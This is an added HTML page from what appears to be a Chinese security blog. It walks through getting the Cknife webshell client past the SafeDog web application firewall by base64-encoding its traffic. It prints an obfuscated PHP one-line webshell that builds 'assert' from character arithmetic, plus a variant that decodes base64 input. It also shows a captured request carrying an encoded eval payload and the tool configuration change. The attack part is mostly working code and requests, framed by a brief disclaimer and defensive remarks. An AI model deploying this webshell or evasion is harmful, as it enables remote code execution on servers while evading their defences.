@@ -1,0 +1,224 @@
+<!DOCTYPE html>
+<html lang=""><head>
+    <meta charset="utf-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">
+
+    <title>Cknife Bypass WAF</title>
+    <meta name="description" content="倾旋的博客">
+    <meta name="author" content='倾旋'>
+
+    <link href="https://fonts.googleapis.com/css2?family=Inconsolata:wght@400;700&display=swap" rel="stylesheet">
+    <link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/bootstrap@4.5.3/dist/css/bootstrap.min.css" integrity="sha384-TX8t27EcRE3e/ihU7zmQxVncDAy5uIKz4rEkgIXeMed4M0jlfIDPvg6uqKI2xXr2" crossorigin="anonymous">
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/5.15.3/css/all.min.css" integrity="sha512-iBBXm8fW90+nuLcSKlbmrPcLa0OT92xO1BIsZ+ywDWZCvqsWgccV3gFoRBv0z+8dLJgyAHIhR35VZc2oM/gI1w==" crossorigin="anonymous">
+
+    
+    <link rel="stylesheet" href="/sass/researcher.min.css">
+
+    
+        <link rel="icon" type="image/ico" href="https://payloads.online/favicon.ico">
+    
+
+    
+        
+    
+</head>
+
+    <body><div class="container mt-5">
+    <nav class="navbar navbar-expand-sm flex-column flex-sm-row text-nowrap p-0">
+        <a class="navbar-brand mx-0 mr-sm-auto" style="color: #dc3545;" href="https://payloads.online" title="倾旋的博客">
+          
+          倾旋的博客
+        </a>
+        <div class="navbar-nav flex-row flex-wrap justify-content-center">
+            
+                
+                
+                    <a class="nav-item nav-link" href="/about" title="About">
+                        About
+                    </a>
+                    
+                        <span class="nav-item navbar-text mx-1">/</span>
+                    
+                
+                    <a class="nav-item nav-link" href="/projects/" title="Projects">
+                        <svg xmlns="http://www.w3.org/2000/svg" width="16" height="16" fill="currentColor" class="bi bi-terminal-fill" viewBox="0 0 16 16"><path d="M0 3a2 2 0 0 1 2-2h12a2 2 0 0 1 2 2v10a2 2 0 0 1-2 2H2a2 2 0 0 1-2-2V3zm9.5 5.5h-3a.5.5 0 0 0 0 1h3a.5.5 0 0 0 0-1zm-6.354-.354a.5.5 0 1 0 .708.708l2-2a.5.5 0 0 0 0-.708l-2-2a.5.5 0 1 0-.708.708L4.793 6.5 3.146 8.146z"/></svg> Projects
+                    </a>
+                    
+                        <span class="nav-item navbar-text mx-1">/</span>
+                    
+                
+                    <a class="nav-item nav-link" href="/links/" title="Links">
+                        Links
+                    </a>
+                    
+                        <span class="nav-item navbar-text mx-1">/</span>
+                    
+                
+                    <a class="nav-item nav-link" href="/post/" title="Posts">
+                        Posts
+                    </a>
+                    
+                        <span class="nav-item navbar-text mx-1">/</span>
+                    
+                
+                    <a class="nav-item nav-link" href="/index.xml" title="Rss">
+                        Rss
+                    </a>
+                    
+                        <span class="nav-item navbar-text mx-1">/</span>
+                    
+                
+                    <a class="nav-item nav-link" href="/tools/" title="Tools">
+                        Tools
+                    </a>
+                    
+                
+            
+        </div>
+    </nav>
+</div>
+<hr>
+<div id="content">
+<div class="container">
+    <h2 id="0x00-前言">0x00 前言</h2>
+<p>这篇文章之前写过，由于博客关闭，重写一遍。</p>
+<p>由于传播、利用此文所提供的信息而造成的任何直接或者间接的后果及损失，均由使用者本人负责，本博主不为此承担任何责任。</p>
+<blockquote>
+<p>主要思路就是讲工具传输的内容加密，绕过WAF的匹配。</p>
+</blockquote>
+<p>所需要的环境：</p>
+<ul>
+<li>Windows Server 2003</li>
+<li>Safe dog 4.0 正式版</li>
+<li>CKnife 1.0 Release</li>
+<li>BurpSuite 1.6</li>
+<li>ByPass 一句话木马一枚</li>
+</ul>
+<p>Bypass Shell 具体可以点击这里寻找：<a href="https://code.csdn.net/payloads/webshell/tree/master/PHP/20170526_bypass">Bypass Shell</a></p>
+<p><code>Shell Code</code> 如下：</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-php" data-lang="php"><span style="color:#f92672">&lt;?</span><span style="color:#a6e22e">php</span>
+$___Ss <span style="color:#f92672">=</span> <span style="color:#a6e22e">chr</span>((<span style="color:#ae81ff">97</span> <span style="color:#f92672">^</span> <span style="color:#ae81ff">1</span>)<span style="color:#f92672">+</span><span style="color:#ae81ff">1</span>);  <span style="color:#75715e">//[a]
+</span><span style="color:#75715e"></span>$___Ss <span style="color:#f92672">.=</span><span style="color:#a6e22e">chr</span>((<span style="color:#ae81ff">115</span> <span style="color:#f92672">^</span> <span style="color:#ae81ff">1</span>)<span style="color:#f92672">+</span><span style="color:#ae81ff">1</span>); <span style="color:#75715e">//[s]
+</span><span style="color:#75715e"></span>$___Ss <span style="color:#f92672">.=</span><span style="color:#a6e22e">chr</span>((<span style="color:#ae81ff">115</span> <span style="color:#f92672">^</span> <span style="color:#ae81ff">1</span>)<span style="color:#f92672">+</span><span style="color:#ae81ff">1</span>); <span style="color:#75715e">//[s]
+</span><span style="color:#75715e"></span>$___Ss <span style="color:#f92672">.=</span><span style="color:#a6e22e">chr</span>((<span style="color:#ae81ff">101</span> <span style="color:#f92672">^</span> <span style="color:#ae81ff">1</span>)<span style="color:#f92672">+</span><span style="color:#ae81ff">1</span>); <span style="color:#75715e">//[e]
+</span><span style="color:#75715e"></span>$___Ss <span style="color:#f92672">.=</span><span style="color:#a6e22e">chr</span>((<span style="color:#ae81ff">114</span> <span style="color:#f92672">^</span> <span style="color:#ae81ff">0</span>)); <span style="color:#75715e">//[r]
+</span><span style="color:#75715e"></span>$___Ss <span style="color:#f92672">.=</span><span style="color:#a6e22e">chr</span>((<span style="color:#ae81ff">116</span> <span style="color:#f92672">^</span> <span style="color:#ae81ff">0</span>)); <span style="color:#75715e">//[t]
+</span><span style="color:#75715e"></span>$___Ss($_POST[<span style="color:#e6db74">&#39;username&#39;</span>]);
+</code></pre></div><h2 id="0x01-普通传输模式分析">0x01 普通传输模式分析</h2>
+<p>首先我们在WAF开启的情况下直接连接：</p>
+<p><img src="https://rvn0xsy.oss-cn-shanghai.aliyuncs.com/2017-06-05/0x00.png" alt="添加Shell"></p>
+<p>接着为了方便分析，我们为当前条目添加上一个代理，通过<code>Burp</code>来分析与服务器端木马的交互数据。</p>
+<p><img src="https://rvn0xsy.oss-cn-shanghai.aliyuncs.com/2017-06-05/0x01.png" alt="添加代理"></p>
+<p>双击进行连接后，数据包到了我们的Burp中：</p>
+<p><img src="https://rvn0xsy.oss-cn-shanghai.aliyuncs.com/2017-06-05/0x02.png" alt="分析数据"></p>
+<p>可以看到已经被<code>WAF</code>拦截了：</p>
+<p><img src="https://rvn0xsy.oss-cn-shanghai.aliyuncs.com/2017-06-05/0x03.png" alt="拦截截图"></p>
+<p>那么我们深知，手工的话是不会被拦截的，为什么呢？</p>
+<p>手工截图：</p>
+<p><img src="https://rvn0xsy.oss-cn-shanghai.aliyuncs.com/2017-06-05/0x05.png" alt="手工"></p>
+<h2 id="0x02-站在waf的角度考虑">0x02 站在WAF的角度考虑</h2>
+<p>先来看看数据包：</p>
+<pre><code>POST /3.php HTTP/1.1
+User-Agent: Java/1.8.0_131
+Host: 192.168.1.103
+Accept: text/html, image/gif, image/jpeg, *; q=.2, */*; q=.2
+Proxy-Connection: keep-alive
+Content-type: application/x-www-form-urlencoded
+Content-Length: 680
+
+username=@eval(base64_decode($_POST[action]));&amp;action=QGluaV9zZXQoImRpc3BsYXlfZXJyb3JzIiwiMCIpO0BzZXRfdGltZV9saW1pdCgwKTtAc2V0X21hZ2ljX3F1b3Rlc19ydW50aW1lKDApO2VjaG8oIi0%2BfCIpOzskRD1kaXJuYW1lKCRfU0VSVkVSWyJTQ1JJUFRfRklMRU5BTUUiXSk7aWYoJEQ9PSIiKSREPWRpcm5hbWUoJF9TRVJWRVJbIlBBVEhfVFJBTlNMQVRFRCJdKTskUj0ieyREfVx0IjtpZihzdWJzdHIoJEQsMCwxKSE9Ii8iKXtmb3JlYWNoKHJhbmdlKCJBIiwiWiIpIGFzICRMKWlmKGlzX2RpcigieyRMfToiKSkkUi49InskTH06Ijt9JFIuPSJcdCI7JHU9KGZ1bmN0aW9uX2V4aXN0cygncG9zaXhfZ2V0ZWdpZCcpKT9AcG9zaXhfZ2V0cHd1aWQoQHBvc2l4X2dldGV1aWQoKSk6Jyc7JHVzcj0oJHUpPyR1WyduYW1lJ106QGdldF9jdXJyZW50X3VzZXIoKTskUi49cGhwX3VuYW1lKCk7JFIuPSIoeyR1c3J9KSI7cHJpbnQgJFI7O2VjaG8oInw8LSIpO2RpZSgpOw%3D%3D
+</code></pre><p>分析出以下几点可疑行为：</p>
+<ul>
+<li>首先普通用户的UserAgent肯定是常见的终端标识，那么数据包中的<code>User-Agent</code>就可能成为WAF的拦截对象</li>
+<li>username参数的值非常可疑，因为有<code>eval</code>、<code>base64_decode</code>、<code>$_POST</code>等标识。</li>
+</ul>
+<p>随之我们根据<code>Shell Code</code>与<code>数据包</code>来分析代码的执行流程：</p>
+<p>当我们的<code>username=@eval(base64_decode($_POST[action]));</code>传给服务器后，又开辟了一个参数再传递给<code>eval</code>，在我们看来都是多此一举的，我们只要直接把数据传递给<code>username</code>即可。</p>
+<p>我在此没有发现能够更改这种传输方式，没有去看源码。</p>
+<p>最终我通过了另一种方式去更改传递数据。</p>
+<h2 id="0x03-just-do-it">0x03 Just Do it</h2>
+<p>先看看Cknife的配置文件<code>Config.ini</code>说明：</p>
+<pre><code>PARAM1=z1         			       参数1 
+PARAM2=z2         			       参数2 
+PHP_BASE64=1   				       当为PHP时，Z1，Z2参数是否开启自动base64加密，如果想定义自己的加密方式则关闭设置为0 
+PHP_MAKE=@eval(base64_decode($_POST[action])); 生成方式，这里可以不用该方式，可以用你任何想要的方式 
+</code></pre><p>最关键的就是<code>PHP_MAKE</code>参数了，我们将其改成base64编码后的结果。</p>
+<pre><code>PHP_BASE64=1
+PHP_MAKE=ZXZhbChiYXNlNjRfZGVjb2RlKCRfUE9TVFthY3Rpb25dKSk\=
+</code></pre><p>这里多了一个<code>\</code>，是jar程序自己转码的。读者可以将此<code>code</code>去<code>base64_decode</code>一下，看看是不是 <code>@eval(base64_decode($_POST[action]));</code></p>
+<p>那么此时是否真的能够Bypass呢？</p>
+<p>NO NO NO，因为我们的Shell Code并没有解码功能。</p>
+<p>更改后如下：</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-php" data-lang="php"><span style="color:#f92672">&lt;?</span><span style="color:#a6e22e">php</span>
+$___Ss <span style="color:#f92672">=</span> <span style="color:#a6e22e">chr</span>((<span style="color:#ae81ff">97</span> <span style="color:#f92672">^</span> <span style="color:#ae81ff">1</span>)<span style="color:#f92672">+</span><span style="color:#ae81ff">1</span>);  <span style="color:#75715e">//[a]
+</span><span style="color:#75715e"></span>$___Ss <span style="color:#f92672">.=</span><span style="color:#a6e22e">chr</span>((<span style="color:#ae81ff">115</span> <span style="color:#f92672">^</span> <span style="color:#ae81ff">1</span>)<span style="color:#f92672">+</span><span style="color:#ae81ff">1</span>); <span style="color:#75715e">//[s]
+</span><span style="color:#75715e"></span>$___Ss <span style="color:#f92672">.=</span><span style="color:#a6e22e">chr</span>((<span style="color:#ae81ff">115</span> <span style="color:#f92672">^</span> <span style="color:#ae81ff">1</span>)<span style="color:#f92672">+</span><span style="color:#ae81ff">1</span>); <span style="color:#75715e">//[s]
+</span><span style="color:#75715e"></span>$___Ss <span style="color:#f92672">.=</span><span style="color:#a6e22e">chr</span>((<span style="color:#ae81ff">101</span> <span style="color:#f92672">^</span> <span style="color:#ae81ff">1</span>)<span style="color:#f92672">+</span><span style="color:#ae81ff">1</span>); <span style="color:#75715e">//[e]
+</span><span style="color:#75715e"></span>$___Ss <span style="color:#f92672">.=</span><span style="color:#a6e22e">chr</span>((<span style="color:#ae81ff">114</span> <span style="color:#f92672">^</span> <span style="color:#ae81ff">0</span>)); <span style="color:#75715e">//[r]
+</span><span style="color:#75715e"></span>$___Ss <span style="color:#f92672">.=</span><span style="color:#a6e22e">chr</span>((<span style="color:#ae81ff">116</span> <span style="color:#f92672">^</span> <span style="color:#ae81ff">0</span>)); <span style="color:#75715e">//[t]
+</span><span style="color:#75715e"></span>$___Ss(<span style="color:#a6e22e">base64_decode</span>($_POST[<span style="color:#e6db74">&#39;username&#39;</span>]));
+</code></pre></div><p>传递过去后在服务器端其实运行的代码可以这么理解为：</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-php" data-lang="php"><span style="color:#f92672">&lt;?</span><span style="color:#a6e22e">php</span>
+$___Ss <span style="color:#f92672">=</span> <span style="color:#a6e22e">chr</span>((<span style="color:#ae81ff">97</span> <span style="color:#f92672">^</span> <span style="color:#ae81ff">1</span>)<span style="color:#f92672">+</span><span style="color:#ae81ff">1</span>);  <span style="color:#75715e">//[a]
+</span><span style="color:#75715e"></span>$___Ss <span style="color:#f92672">.=</span><span style="color:#a6e22e">chr</span>((<span style="color:#ae81ff">115</span> <span style="color:#f92672">^</span> <span style="color:#ae81ff">1</span>)<span style="color:#f92672">+</span><span style="color:#ae81ff">1</span>); <span style="color:#75715e">//[s]
+</span><span style="color:#75715e"></span>$___Ss <span style="color:#f92672">.=</span><span style="color:#a6e22e">chr</span>((<span style="color:#ae81ff">115</span> <span style="color:#f92672">^</span> <span style="color:#ae81ff">1</span>)<span style="color:#f92672">+</span><span style="color:#ae81ff">1</span>); <span style="color:#75715e">//[s]
+</span><span style="color:#75715e"></span>$___Ss <span style="color:#f92672">.=</span><span style="color:#a6e22e">chr</span>((<span style="color:#ae81ff">101</span> <span style="color:#f92672">^</span> <span style="color:#ae81ff">1</span>)<span style="color:#f92672">+</span><span style="color:#ae81ff">1</span>); <span style="color:#75715e">//[e]
+</span><span style="color:#75715e"></span>$___Ss <span style="color:#f92672">.=</span><span style="color:#a6e22e">chr</span>((<span style="color:#ae81ff">114</span> <span style="color:#f92672">^</span> <span style="color:#ae81ff">0</span>)); <span style="color:#75715e">//[r]
+</span><span style="color:#75715e"></span>$___Ss <span style="color:#f92672">.=</span><span style="color:#a6e22e">chr</span>((<span style="color:#ae81ff">116</span> <span style="color:#f92672">^</span> <span style="color:#ae81ff">0</span>)); <span style="color:#75715e">//[t]
+</span><span style="color:#75715e"></span>$___Ss(<span style="color:#a6e22e">base64_decode</span>(<span style="color:#e6db74">&#39;ZXZhbChiYXNlNjRfZGVjb2RlKCRfUE9TVFthY3Rpb25dKSk=&#39;</span>);
+</code></pre></div><p>解码后是：<code>$___Ss(@eval(base64_decode($_POST[action])))</code></p>
+<p>再次简化为：<code>assert(@eval(base64_decode($_POST[action])))</code></p>
+<p>那么现在你就应该可以明白了，我们的Cknife传出的全部都是Base64编码，从而绕过WAF对数据包敏感词汇的匹配。</p>
+<blockquote>
+<p>个人认为Base64目前是最为方便的传输方式，因为该传输行为与开发人员极其相似，例如：图片base64传输，还有我们<code>Shell Code</code>中使用的参数，也是开发人员经常用到的 <code>username</code></p>
+</blockquote>
+<p>此时更改好后我们去try一下 ～</p>
+<p><img src="https://rvn0xsy.oss-cn-shanghai.aliyuncs.com/2017-06-05/0x06.png" alt="Success"></p>
+<p>看来已经成功了。</p>
+<p>查看进程：</p>
+<p><img src="https://rvn0xsy.oss-cn-shanghai.aliyuncs.com/2017-06-05/0x07.png" alt="Command"></p>
+<p>图中选中的进程<code>SafeDogSiteApache.exe</code>，就是WAF了，一切都没有拦截。</p>
+<h2 id="0x04-最后的思考">0x04 最后的思考</h2>
+<p>如果想做到真正的安全，还是要深入行为查杀，当前的WAF不是很强大，基本上通过匹配数据包的内容已经无法满足防护的需求了。</p>
+<p>因为当前的传输方式是通过正常的手法去传输的。</p>
+<p>下一次升级可以考虑进行各种可能的解码…… 不过只是亡羊补牢的做法罢了。</p>
+<p>最终还是要加强木马的查杀，相关文章<a href="https://zhuanlan.zhihu.com/p/27148719">脚本木马查杀原理的简单探讨</a></p>
+<p>由于文章比较敏感，就不在知乎发布了。 感谢阅读，微信公众号：<code>知安小酒馆</code> 欢迎关注 ！</p>
+<p>我的微信：Guest_Killer_0nlis</p>
+
+</div>
+
+        </div><div id="footer" class="mb-5">
+    <hr>
+    <div class="container text-center">
+        
+            <a href="https://twitter.com/Rvn0xsy" class="fab fa-twitter fa-1x" title="Twitter"></a>
+        
+            <a href="mailto:rvn0xsy@gmail.com" class="fas fa-envelope fa-1x" title="E-mail"></a>
+        
+    </div>
+    
+        <div class="container text-center">
+            <a href="https://payloads.online" title="- PAYLOADS.ONLINE -"><small>- PAYLOADS.ONLINE -</small></a>
+        </div>
+    
+</div>
+
+
+
+<script src="https://cdn.jsdelivr.net/gh/jmnote/plantuml-encoder@1.2.4/dist/plantuml-encoder.min.js" integrity="sha256-Qsk2KRBCN5qVZX7B+8+2IvQl1Aqc723qV1tBCQaVoqo=" crossorigin="anonymous"></script>
+<script>
+(function(){
+  let plantumlPrefix = "language-plantuml";
+  Array.prototype.forEach.call(document.querySelectorAll("[class^=" + plantumlPrefix + "]"), function(code){
+    let image = document.createElement("IMG");
+    image.loading = 'lazy'; 
+    image.src = 'http://www.plantuml.com/plantuml/svg/~1' + plantumlEncoder.encode(code.innerText);
+    code.parentNode.insertBefore(image, code);
+    code.style.display = 'none';
+  });
+})();
+</script>
+
+</body>
+</html>
